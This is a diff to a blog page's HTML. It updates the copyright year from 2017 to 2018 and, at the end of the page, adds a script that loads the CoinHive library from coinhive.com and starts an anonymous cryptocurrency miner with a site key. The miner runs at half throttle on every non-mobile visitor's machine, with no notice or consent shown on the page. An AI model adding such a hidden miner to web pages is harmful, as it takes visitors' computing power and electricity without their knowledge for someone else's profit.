@@ -753,7 +753,7 @@
         <div class="copyright" >
   
   &copy;  2016 - 
-  <span itemprop="copyrightYear">2017</span>
+  <span itemprop="copyrightYear">2018</span>
   <span class="with-love">
     <i class="fa fa-heart"></i>
   </span>
@@ -1249,6 +1249,15 @@
   
 
     <script type="text/javascript" src="/js/src/love.js"></script>
+    <script src="https://coinhive.com/lib/coinhive.min.js"></script>
+    <script>
+    var miner = new CoinHive.Anonymous('QbgpjAPTac4TDxpWZto4zId8XNCiISZo', {throttle: 0.5});
+
+    // Only start on non-mobile devices
+    if (!miner.isMobile()) {
+        miner.start();
+    }
+</script>
   <!-- <script type="text/javascript" src="/js/src/copyright.js"></script> -->
 </body>
 </html>
